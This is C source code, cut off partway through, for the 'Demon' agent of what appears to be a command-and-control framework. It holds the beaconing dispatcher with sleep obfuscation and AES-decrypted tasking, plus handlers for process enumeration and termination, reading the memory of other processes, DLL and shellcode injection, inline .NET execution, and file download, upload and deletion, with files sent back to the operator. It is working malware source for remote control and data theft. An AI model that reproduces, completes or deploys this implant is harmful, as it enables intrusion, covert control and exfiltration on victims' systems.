#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Command.h>
#include <Core/Token.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Core/SleepObf.h>
#include <Core/Download.h>
#include <Core/Dotnet.h>

#include <Loader/CoffeeLdr.h>
#include <Inject/Inject.h>

SEC_DATA DEMON_COMMAND DemonCommands[] = {
        { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
        { .ID = DEMON_COMMAND_CHECKIN,                  .Function = CommandCheckin                  },
        { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
        { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
        { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
        { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
        { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
        { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
        { .ID = DEMON_COMMAND_ASSEMBLY_VERSIONS,        .Function = CommandAssemblyListVersion      },
        { .ID = DEMON_COMMAND_CONFIG,                   .Function = CommandConfig                   },
        { .ID = DEMON_COMMAND_SCREENSHOT,               .Function = CommandScreenshot               },
        { .ID = DEMON_COMMAND_PIVOT,                    .Function = CommandPivot                    },
        { .ID = DEMON_COMMAND_NET,                      .Function = CommandNet                      },
        { .ID = DEMON_COMMAND_INJECT_DLL,               .Function = CommandInjectDLL                },
        { .ID = DEMON_COMMAND_INJECT_SHELLCODE,         .Function = CommandInjectShellcode          },
        { .ID = DEMON_COMMAND_SPAWN_DLL,                .Function = CommandSpawnDLL                 },
        { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
        { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
        { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
        { .ID = DEMON_EXIT,                             .Function = CommandExit                     },

        // End
        { .ID = NULL, .Function = NULL }
};

VOID CommandDispatcher( VOID )
{
    PPACKAGE Package;
    PARSER   Parser         = { 0 };
    LPVOID   DataBuffer     = NULL;
    UINT32   DataBufferSize = 0;
    PARSER   TaskParser     = { 0 };
    LPVOID   TaskBuffer     = NULL;
    UINT32   TaskBufferSize = 0;
    UINT32   CommandID      = 0;

    PRINTF( "Session ID => %x\n", Instance.Session.AgentID );

    /* Create our request task package */
    Package = PackageCreate( DEMON_COMMAND_GET_JOB );

    /* We don't want it to get destroyed. we kinda want to avoid alloc memory for it everytime. */
    Package->Destroy = FALSE;
    PackageAddInt32( Package, Instance.Session.AgentID );

    do
    {
        if ( ! Instance.Session.Connected )
            return;

        SleepObf( Instance.Config.Sleeping * 1000 );

#ifdef TRANSPORT_HTTP
        /* Send our buffer. */
        if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
        {
            CommandExit( NULL );
        }

/* SMB */
#else
        if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) )
        {
            CommandExit( NULL );
        }
#endif

        if ( DataBuffer && DataBufferSize > 0 )
        {
            ParserNew( &Parser, DataBuffer, DataBufferSize );
            do
            {
                CommandID  = ParserGetInt32( &Parser );
                TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );

                if ( CommandID != DEMON_COMMAND_NO_JOB )
                {
                    PRINTF( "Task => CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskBuffer, TaskBufferSize )
                    if ( TaskBufferSize != 0 )
                    {
                        ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                        ParserDecrypt( &TaskParser, Instance.Config.AES.Key, Instance.Config.AES.IV );
                    }

                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ )
                    {
                        if ( DemonCommands[ FunctionCounter ].Function == NULL )
                            break;

                        if ( DemonCommands[ FunctionCounter ].ID == CommandID )
                        {
                            DemonCommands[ FunctionCounter ].Function( &TaskParser );
                            break;
                        }
                    }
                }

            } while ( Parser.Length > 4 );

            MemSet( DataBuffer, 0, DataBufferSize );
            Instance.Win32.LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
            ParserDestroy( &TaskParser );
        }
        else
        {
#ifdef TRANSPORT_HTTP
            PUTS( "TransportSend: Failed" )
            break;
#endif
        }

        /* Check if there is something that a process output is available or check if the jobs are still alive. */
        JobCheckList();

        /* Check if we have something in our Pivots connection and sends back the output from the pipes */
        PivotPush();

        /* push any download chunks we have. */
        DownloadPush();

        /* push any dotnet output we have. */
        DotnetPush();

        /* push any new clients or output from the sockets */
        SocketPush();

    } while ( TRUE );

    Instance.Session.Connected = FALSE;

    PUTS( "Out of while loop" )
}

VOID CommandCheckin( VOID )
{
    PUTS( "Checkin" )

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );

    DemonMetaData( &Package, FALSE );

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSleep( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SLEEP );

    Instance.Config.Sleeping = ParserGetInt32( Parser );
    PRINTF( "Instance.Sleeping: [%d]\n", Instance.Config.Sleeping );

    PackageAddInt32( Package, Instance.Config.Sleeping );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandJob( PPARSER Parser )
{
    PUTS( "Job" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case 0x1: // list
        {
            PUTS( "Job::list" )
            PJOB_DATA JobList = Instance.Jobs;

            do {
                if ( JobList )
                {
                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]\n", JobList->JobID, JobList->Type, JobList->State )

                    PackageAddInt32( Package, JobList->JobID );
                    PackageAddInt32( Package, JobList->Type );
                    PackageAddInt32( Package, JobList->State );

                    JobList = JobList->Next;
                } else
                    break;

            } while ( TRUE );

            break;
        }

        case 0x2: // suspend
        {
            PUTS( "Job::suspend" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobSuspend( JobID );

            PRINTF( "JobID:[%d] Success:[%d]", JobID, Success )

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case 0x3: // resume
        {
            PUTS( "Job::resume" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobResume( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case 0x4: // kill & remove
        {
            PUTS( "Job::kill" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobKill( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandProc( PPARSER Parser )
{
    SHORT       SubCommand  = ( SHORT ) ParserGetInt32( Parser );
    PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );
    NTSTATUS    NtStatus    = STATUS_SUCCESS;

    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {
        case 2: PUTS("Proc::Modules")
        {
            PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
            UINT32                    ProcessID        = 0;
            HANDLE                    hProcess         = NULL;
            HANDLE                    hToken           = NULL;
            NTSTATUS                  NtStatus         = STATUS_SUCCESS;
            OBJECT_ATTRIBUTES         ObjAttr          = { sizeof( OBJECT_ATTRIBUTES ) };

            if ( Parser->Length > 0 )
                ProcessID = ParserGetInt32( Parser );
            else
                ProcessID = Instance.Session.PID;

            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
            Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );

            NtStatus = Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
            if ( NT_SUCCESS( NtStatus ) )
            {
                PPEB_LDR_DATA           LoaderData              = NULL;
                PLIST_ENTRY             ListHead, ListEntry     = NULL;
                SIZE_T                  Size                    = 0;
                LDR_DATA_TABLE_ENTRY    CurrentModule           = { 0 };
                WCHAR                   ModuleNameW[ MAX_PATH ] = { 0 };
                CHAR                    ModuleName[ MAX_PATH ]  = { 0 };

                PackageAddInt32( Package, ProcessID );

                if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                {
                    ListHead = & LoaderData->InMemoryOrderModuleList;

                    Size = 0;
                    if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
                    {
                        while ( ListEntry != ListHead )
                        {
                            if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
                            {
                                Instance.Syscall.NtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );

                                if ( CurrentModule.FullDllName.Length > 0 )
                                {
                                    Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );

                                    PackageAddBytes( Package, ModuleName, Size );
                                    PackageAddInt32( Package, ( UINT32 ) CurrentModule.DllBase );
                                }

                                MemSet( ModuleNameW, 0, MAX_PATH );
                                MemSet( ModuleName, 0, MAX_PATH );

                                ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
                            }
                        }
                    }
                }
            }

            if ( hProcess )
                Instance.Win32.NtClose( hProcess );

            if ( hToken )
                Instance.Win32.NtClose( hToken );

            break;
        }

        case 3: PUTS("Proc::Grep")
        {
            PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
            PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
            SIZE_T                      ProcessInfoSize = 0;
            NTSTATUS                    NtStatus        = STATUS_SUCCESS;
            ULONG                       ProcessSize     = 0;
            PCHAR                       ProcessName     = NULL;

            /* Process Name and Process User token */
            CHAR    ProcName[ MAX_PATH ] = { 0 };
            UINT32  ProcNameSize         = 0;
            PCHAR   ProcUserName         = NULL;
            UINT32  ProcUserSize         = 0;

            ProcessName = ParserGetBytes( Parser, &ProcessSize );

            if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
            {
                PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );

                /* save the original pointer to free */
                PtrProcessInfo = SysProcessInfo;

                while ( TRUE )
                {
                    ProcNameSize = WCharStringToCharString( ProcName, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
                    INT32 MemRet = MemCompare( ProcName, ProcessName, ProcessSize );

                    if ( MemRet == 0 )
                    {
                        PUTS( "1" )
                        HANDLE hProcess = NULL;
                        HANDLE hToken   = NULL;

                        hProcess = ProcessOpen( SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );

                        if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
                            ProcUserName = TokenGetUserDomain( hToken, &ProcUserSize );

                        PUTS( "2" )
                        PackageAddBytes( Package, ProcName, ProcNameSize );
                        PackageAddInt32( Package, ( UINT32 ) SysProcessInfo->UniqueProcessId  );
                        PackageAddInt32( Package, ( UINT32 ) SysProcessInfo->InheritedFromUniqueProcessId );
                        PackageAddBytes( Package, ProcUserName, ProcUserSize );
                        PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );

                        PUTS( "3" )
#ifdef DEBUG
                        if ( SysProcessInfo->UniqueProcessId != Instance.Session.PID )
#endif
                            Instance.Win32.NtClose( hProcess );

                        if ( hToken )
                            Instance.Win32.NtClose( hToken );

                        MemSet( ProcUserName, 0, ProcUserSize );
                        if ( ProcUserName )
                            Instance.Win32.LocalFree( ProcUserName );
                    }

                    if ( SysProcessInfo->NextEntryOffset == 0 )
                        break;

                    SysProcessInfo = ( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
                }

                if ( PtrProcessInfo )
                {
                    MemSet( PtrProcessInfo, 0, ProcessInfoSize );
                    NtHeapFree( PtrProcessInfo );
                    PtrProcessInfo = NULL;
                    SysProcessInfo = NULL;
                }
            }
            else
            {
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                CALLBACK_ERROR_WIN32;
            }

            break;
        }

        case 4: PUTS( "Proc::Create" )
        {
            // TODO: finish this
            PROCESS_INFORMATION ProcessInfo     = { 0 };
            UINT32              ProcessSize     = 0;
            UINT32              ProcessArgsSize = 0;
            UINT32              ProcessState    = ParserGetInt32( Parser );
            PCHAR               Process         = ParserGetBytes( Parser, &ProcessSize );
            PCHAR               ProcessArgs     = ParserGetBytes( Parser, &ProcessArgsSize );
            BOOL                ProcessPiped    = ParserGetInt32( Parser );
            BOOL                ProcessVerbose  = ParserGetInt32( Parser );

            if ( ProcessSize == 0 )
                Process = NULL;
            else
                Process[ ProcessSize ] = 0;

            if ( ProcessArgsSize == 0 )
                ProcessArgs = NULL;
            else
                ProcessArgs[ ProcessArgsSize ] = 0;

            PRINTF( "Process State   : %d\n", ProcessState );
            PRINTF( "Process         : %s [%d]\n", Process, ProcessSize );
            PRINTF( "Process Args    : %s [%d]\n", ProcessArgs, ProcessArgsSize );
            PRINTF( "Process Piped   : %s [%d]\n", ProcessPiped ? "TRUE" : "FALSE", ProcessPiped );
            PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );

            // TODO: make it optional to choose process arch
            // TODO: cleanup process info
            if ( ! ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL ) )
            {
                PackageDestroy( Package );
                return;
            }
            else
            {
                if ( ProcessVerbose )
                    PackageAddInt32( Package, ProcessInfo.dwProcessId );

                // Instance.Win32.NtClose( ProcessInfo.hThread );

                PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
            }

            break;
        }

        case 6: PUTS( "Proc::Memory" )
        {
            DWORD                    ProcessID   = ParserGetInt32( Parser );
            DWORD                    QueryProtec = ParserGetInt32( Parser );
            MEMORY_BASIC_INFORMATION MemInfo     = {};
            LPVOID                   Offset      = 0;
            SIZE_T                   Result      = 0;
            HANDLE                   hProcess    = NULL;
            OBJECT_ATTRIBUTES        ObjAttr     = { 0 };
            CLIENT_ID                ClientID    = { 0 };

            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
            if ( hProcess )
            {
                PackageAddInt32( Package, ProcessID );
                PackageAddInt32( Package, QueryProtec );

                while ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                {
                    Offset = C_PTR( U_PTR( MemInfo.BaseAddress ) + MemInfo.RegionSize );

                    if ( MemInfo.Type != MEM_FREE )
                    {
                        if ( MemInfo.AllocationBase != 0 )
                        {
                            if ( QueryProtec == 0 )
                            {
                                // Since the Protection to query isn't specified we just list every memory region
                                PackageAddInt32( Package, MemInfo.BaseAddress );
                                PackageAddInt32( Package, MemInfo.RegionSize );
                                PackageAddInt32( Package, MemInfo.AllocationProtect );
                                PackageAddInt32( Package, MemInfo.State );
                                PackageAddInt32( Package, MemInfo.Type );
                            }
                            else
                            {
                                if ( QueryProtec == MemInfo.AllocationProtect )
                                {
                                    PRINTF( "Search for memory region: %d\n", QueryProtec )
                                    // Add found memory region with specified memory protection
                                    PackageAddInt32( Package, MemInfo.BaseAddress );
                                    PackageAddInt32( Package, MemInfo.RegionSize );
                                    PackageAddInt32( Package, MemInfo.AllocationProtect );
                                    PackageAddInt32( Package, MemInfo.State );
                                    PackageAddInt32( Package, MemInfo.Type );
                                }
                            }
                        }
                    }
                }

                Offset = NULL;
            }

            if ( hProcess )
            {
                Instance.Win32.NtClose( hProcess );
                hProcess = NULL;
            }

            break;
        }

        case 7: PUTS( "Proc::Kill" )
        {
            DWORD  dwProcessID = ParserGetInt32( Parser );
            HANDLE hProcess    = NULL;

            hProcess = ProcessOpen( dwProcessID, PROCESS_TERMINATE );
            if ( hProcess )
                Instance.Win32.TerminateProcess( hProcess, 0 );

            PackageAddInt32( Package, hProcess ? TRUE : FALSE );
            PackageAddInt32( Package, dwProcessID );

            if ( hProcess )
            {
                Instance.Win32.NtClose( hProcess );
                hProcess = NULL;
            }

            break;
        }
    }

    // TODO: handle error
    PackageTransmit( Package, NULL, NULL );
}


VOID CommandProcList( PPARSER Parser )
{
    PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
    PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
    SIZE_T                      ProcessInfoSize = 0;
    PPACKAGE                    Package         = NULL;
    NTSTATUS                    NtStatus        = STATUS_SUCCESS;
    DWORD                       ProcessUI       = 0;

    if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
    {
        PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );

        /* save the original pointer to free */
        PtrProcessInfo = SysProcessInfo;

        /* Create our package */
        Package   = PackageCreate( DEMON_COMMAND_PROC_LIST );
        ProcessUI = ParserGetInt32( Parser );

        /* did we get this request from the Client Process Explorer or Console ? */
        PackageAddInt32( Package, ProcessUI );

        while ( TRUE )
        {
            PCHAR  ProcessUser = NULL;
            HANDLE hToken      = NULL;
            DWORD  UserSize    = 0;
            HANDLE hProcess    = NULL;

            /* open handle to each process with query information privilege since we dont need anything else besides basic info */
            hProcess = ProcessOpen( SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );

            /* Retrieve process token user */
            if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
                ProcessUser = TokenGetUserDomain( hToken, &UserSize );

            /* Now we append the collected process data to the process list  */
            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
            PackageAddInt32( Package, SysProcessInfo->UniqueProcessId );
            PackageAddInt32( Package, ProcessIsWow( hProcess ) );
            PackageAddInt32( Package, SysProcessInfo->InheritedFromUniqueProcessId );
            PackageAddInt32( Package, SysProcessInfo->SessionId );
            PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
            PackageAddBytes( Package, ProcessUser, UserSize );

            /* Now lets cleanup */
#ifdef DEBUG
            /* ignore this. is just for the debug prints.
             * if we close the handle to our own process we won't see any debug prints anymore */
            if ( SysProcessInfo->UniqueProcessId != Instance.Session.PID )
                Instance.Win32.NtClose( hProcess );
#else
            if ( hProcess )
                Instance.Win32.NtClose( hProcess );
#endif

            if ( hToken )
                Instance.Win32.NtClose( hToken );

            if ( ProcessUser )
            {
                MemSet( ProcessUser, 0, UserSize );
                Instance.Win32.LocalFree( ProcessUser );
                ProcessUser = NULL;
            }

            /* there are no processes left. */
            if ( ! SysProcessInfo->NextEntryOffset )
                break;

            /* now go to the next process */
            SysProcessInfo = U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset;
        }

        PackageTransmit( Package, NULL, NULL );

        /* Free our process list */
        if ( PtrProcessInfo )
        {
            MemSet( PtrProcessInfo, 0, ProcessInfoSize );
            NtHeapFree( PtrProcessInfo );
            PtrProcessInfo = NULL;
            SysProcessInfo = NULL;
        }
    }
    else
    {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        CALLBACK_ERROR_WIN32;
    }
}

VOID CommandFS( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_FS );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case 1: PUTS( "FS::Dir" )
        {
            WIN32_FIND_DATAW FindData      = { 0 };
            LPWSTR           Path          = NULL;
            DWORD            PathSize      = 0;
            UCHAR            T[ MAX_PATH ] = { 0 };
            HANDLE           hFile         = NULL;
            ULARGE_INTEGER   FileSize      = { 0 };
            SYSTEMTIME       FileTime      = { 0 };
            SYSTEMTIME       SystemTime    = { 0 };
            DWORD            Return        = 0;
            BOOL             FileExplorer  = FALSE;

            FileExplorer     = ParserGetInt32( Parser );
            Path             = ParserGetBytes( Parser, &PathSize );

            PRINTF( "FileExplorer: %s [%d]\n", FileExplorer ? "TRUE" : "FALSE", FileExplorer )
            PRINTF( "Path        : %ls\n", Path )

            PackageAddInt32( Package, FileExplorer );

            if ( Path[ 0 ] == L'.' )
            {
                if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, &T ) ) )
                {
                    PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                }
                else
                    PackageAddBytes( Package, T, Return * 2 );
            }
            else
            {
                PackageAddBytes( Package, Path, PathSize );
            }

            MemSet( &FindData, 0, sizeof( FindData ) );

            hFile = Instance.Win32.FindFirstFileW( Path, &FindData );
            if ( hFile == INVALID_HANDLE_VALUE )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Instance.Win32.FindClose( hFile );

                PUTS( "LEAVE" )
                goto LEAVE;
            }

            do
            {
                Instance.Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &FileTime );
                Instance.Win32.SystemTimeToTzSpecificLocalTime( 0, &FileTime, &SystemTime );

                if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
                {
                    PackageAddInt32( Package, TRUE );
                    PackageAddInt64( Package, 0 );
                }
                else
                {
                    FileSize.HighPart = FindData.nFileSizeHigh;
                    FileSize.LowPart  = FindData.nFileSizeLow;

                    PackageAddInt32( Package, FALSE );
                    PackageAddInt64( Package, FileSize.QuadPart );
                }

                PackageAddInt32( Package, FileTime.wDay );
                PackageAddInt32( Package, FileTime.wMonth );
                PackageAddInt32( Package, FileTime.wYear );
                PackageAddInt32( Package, SystemTime.wSecond );
                PackageAddInt32( Package, SystemTime.wMinute );
                PackageAddInt32( Package, SystemTime.wHour );
                PackageAddBytes( Package, FindData.cFileName, StringLengthW( FindData.cFileName ) * 2 );
            }
            while ( Instance.Win32.FindNextFileW( hFile, &FindData ) );

            PUTS( "Close File Handle" )
            Instance.Win32.FindClose( hFile );

            break;
        }

        case 2: PUTS( "FS::Download" )
        {
            PDOWNLOAD_DATA Download = NULL;
            BUFFER         FileName = { 0 };
            DWORD          FileSize = 0;
            PVOID          Buffer   = NULL;
            HANDLE         hFile    = NULL;
            BOOL           Success  = TRUE;
            WCHAR          FilePath[ MAX_PATH * 2 ] = { 0 };
            WCHAR          PathSize = MAX_PATH * 2;

            Buffer = ParserGetBytes( Parser, &FileName.Length );

            FileName.Buffer = NtHeapAlloc( FileName.Length + sizeof( WCHAR ) );
            MemCopy( FileName.Buffer, Buffer, FileName.Length );

            PRINTF( "FileName => %ls\n", FileName.Buffer )

            hFile = Instance.Win32.CreateFileW( FileName.Buffer, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )

                CALLBACK_GETLASTERROR

                Success = FALSE;
                goto CleanupDownload;
            }

            PathSize = Instance.Win32.GetFullPathNameW( FileName.Buffer, PathSize, &FilePath, NULL );
            PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )

            FileSize = Instance.Win32.GetFileSize( hFile, 0 );

            /* Start our download. */
            if ( PathSize > 0 )
                Download = DownloadAdd( hFile, FileSize );
            else
                Download = DownloadAdd( hFile, FileSize );

            /*
			 * Download Header:
			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
			 *  [ File ID   ] Download File ID
			 *
			 * Data (Open):
			 *  [ File Size ]
			 *  [ File Name ]
			 *
			 * Data (Write)
			 *  [ Chunk Data ] Size + FileChunk
			 *
			 * Data (Close):
			 *  [  Reason   ] Removed or Finished
			 * */

            /* Download Header */
            PackageAddInt32( Package, DOWNLOAD_MODE_OPEN );
            PackageAddInt32( Package, Download->FileID   );

            /* Download Open Data */
            PackageAddInt32( Package, FileSize ); /* TODO: change this to 64bit or else we can't download files larger than 4gb */
            if ( PathSize > 0 )
                PackageAddBytes( Package, FilePath, PathSize * sizeof( WCHAR ) );
            else
                PackageAddBytes( Package, FileName.Buffer, FileName.Length );

        CleanupDownload:
            PUTS( "CleanupDownload" )

            if ( FileName.Buffer )
            {
                MemSet( FileName.Buffer, 0, FileName.Length );
                NtHeapFree( FileName.Buffer );
                FileName.Buffer = NULL;
            }

            if ( ! Success )
                goto LEAVE;

            break;
        }

        case 3: PUTS( "FS::Upload" )
        {
            DWORD  FileSize = 0;
            DWORD  NameSize = 0;
            DWORD  Written  = 0;
            HANDLE hFile    = NULL;
            LPWSTR FileName = ParserGetBytes( Parser, &NameSize );
            PVOID  Content  = ParserGetBytes( Parser, &FileSize );
            BOOL   Success  = TRUE;

            PRINTF( "FileName[%d] => %ls\n", FileSize, FileName )

            hFile = Instance.Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )
                CALLBACK_GETLASTERROR
                Success = FALSE;
                goto CleanupUpload;
            }

            if ( ! Instance.Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
            {
                PUTS( "WriteFile: Failed" )
                CALLBACK_GETLASTERROR
                Success = FALSE;
                goto CleanupUpload;
            }

            PackageAddInt32( Package, FileSize );
            PackageAddBytes( Package, FileName, NameSize );

        CleanupUpload:
            if ( hFile )
            {
                Instance.Win32.NtClose( hFile );
                hFile = NULL;
            }

            if ( ! Success )
                goto LEAVE;

            break;
        }

        case 4: PUTS( "FS::Cd" )
        {
            DWORD  PathSize = 0;
            LPWSTR Path     = ParserGetBytes( Parser, &PathSize );

            if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto LEAVE;
            }
            else
            {
                PackageAddBytes( Package, Path, PathSize );
            }

            break;
        }

        case 5: PUTS( "FS::Remove" )
        {
            DWORD  PathSize = 0;
            LPWSTR Path     = ParserGetBytes( Parser, &PathSize );
            DWORD  dwAttrib = Instance.Win32.GetFileAttributesW( Path );

            if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
            {
                if ( ! Instance.Win32.RemoveDirectoryW( Path ) )
                {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto LEAVE;
                }
                else
                {
                    PackageAddInt32( Package, TRUE );
                }
            }
            else
            {
                if ( ! Instance.Win32.DeleteFileW( Path ) )
                {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto LEAVE;
                }
                else
                {
                    PackageAddInt32( Package, FALSE );
                }
            }
            PackageAddBytes( Package, Path, PathSize );

            break;
        }

        case 6: PUTS( "FS::Mkdir" )
        {
            DWORD  PathSize = 0;
            LPWSTR Path     = ParserGetBytes( Parser, &PathSize );

            if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto LEAVE;
            }

            PackageAddBytes( Package, Path, PathSize );

            break;
        }

        case 7: PUTS( "FS::Copy" )
        {
            DWORD  FromSize = 0;
            DWORD  ToSize   = 0;
            LPWSTR PathFrom = NULL;
            LPWSTR PathTo   = NULL;
            BOOL   Success  = FALSE;

            PathFrom = ParserGetBytes( Parser, &FromSize );
            PathTo   = ParserGetBytes( Parser, &ToSize );

            PathFrom[ FromSize ] = 0;
            PathTo[ ToSize ]     = 0;

            PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )

            Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
            if ( ! Success )
                CALLBACK_GETLASTERROR

            PackageAddInt32( Package, Success );
            PackageAddBytes( Package, PathFrom, FromSize );
            PackageAddBytes( Package, PathTo, ToSize );

            break;
        }

        case 9: PUTS( "FS::GetPwd" )
        {
            WCHAR Path[ MAX_PATH * 2 ] = { 0 };
            DWORD Return               = 0;

            if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) ) )
            {
                PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }
            else
                PackageAddBytes( Package, Path, Return * 2 );

            break;
        }

        case 10: PUTS( "FS::Cat" )
        {
            DWORD  FileSize = 0;
            DWORD  Read     = 0;
            DWORD  NameSize = 0;
            LPWSTR FileName = ParserGetBytes( Parser, &NameSize );
            HANDLE hFile    = NULL;
            PVOID  Content  = NULL;

            FileName[ NameSize ] = 0;

            PRINTF( "FileName => %ls", FileName )

